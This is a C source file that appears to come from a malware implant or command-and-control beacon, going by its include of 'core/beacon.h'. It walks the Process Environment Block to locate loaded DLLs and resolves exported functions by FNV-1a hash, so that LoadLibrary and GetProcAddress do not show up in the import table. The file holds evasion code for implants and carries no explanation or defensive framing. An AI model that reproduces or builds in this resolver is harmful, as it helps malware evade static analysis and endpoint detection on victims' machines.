// PEB walk + export-by-hash resolver. FNV-1a 32-bit, case-insensitive.
// Avoids GetProcAddress/LoadLibrary in the IAT.
#include "../core/beacon.h"

static uint32_t fnv1a(const uint8_t* s, int widechar) {
    uint32_t h = 0x811C9DC5u;
    if (!widechar) {
        while (*s) {
            uint8_t c = *s++;
            if (c >= 'A' && c <= 'Z') c = (uint8_t)(c + 32);
            h ^= c;
            h *= 0x01000193u;
        }
    } else {
        const wchar_t* w = (const wchar_t*)s;
        while (*w) {
            wchar_t c = *w++;
            if (c >= L'A' && c <= L'Z') c = (wchar_t)(c + 32);
            h ^= (uint8_t)(c & 0xFF);
            h *= 0x01000193u;
            h ^= (uint8_t)(c >> 8);
            h *= 0x01000193u;
        }
    }
    return h;
}

uint32_t api_hash(const char* s)    { return fnv1a((const uint8_t*)s, 0); }
uint32_t api_hash_w(const wchar_t* s){ return fnv1a((const uint8_t*)s, 1); }

typedef struct _LDR_MODULE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitOrderLinks;
    PVOID      BaseAddress;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_MODULE, *PLDR_MODULE;

void* peb_find_module(uint32_t dll_hash) {
#if defined(_M_X64)
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        PLDR_MODULE m = CONTAINING_RECORD(e, LDR_MODULE, InMemoryOrderLinks);
        if (!m->BaseDllName.Buffer) continue;
        // Make a lowercase zero-terminated copy on the stack.
        wchar_t name[128];
        UINT i = 0;
        UINT n = m->BaseDllName.Length / sizeof(wchar_t);
        if (n >= 128) n = 127;
        for (; i < n; ++i) {
            wchar_t c = m->BaseDllName.Buffer[i];
            if (c >= L'A' && c <= L'Z') c = (wchar_t)(c + 32);
            name[i] = c;
        }
        name[i] = 0;
        if (api_hash_w(name) == dll_hash) return m->BaseAddress;
    }
    return NULL;
}

static void* module_export(void* base, uint32_t fn_hash) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* d =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!d->VirtualAddress) return NULL;
    IMAGE_EXPORT_DIRECTORY* exp =
        (IMAGE_EXPORT_DIRECTORY*)((BYTE*)base + d->VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)base + exp->AddressOfNames);
    WORD*  ords  = (WORD*) ((BYTE*)base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)((BYTE*)base + names[i]);
        if (fnv1a((const uint8_t*)name, 0) == fn_hash) {
            return (BYTE*)base + funcs[ords[i]];
        }
    }
    return NULL;
}

void* api_resolve(uint32_t dll_hash, uint32_t fn_hash) {
    void* base = peb_find_module(dll_hash);
    if (!base) return NULL;
    return module_export(base, fn_hash);
}
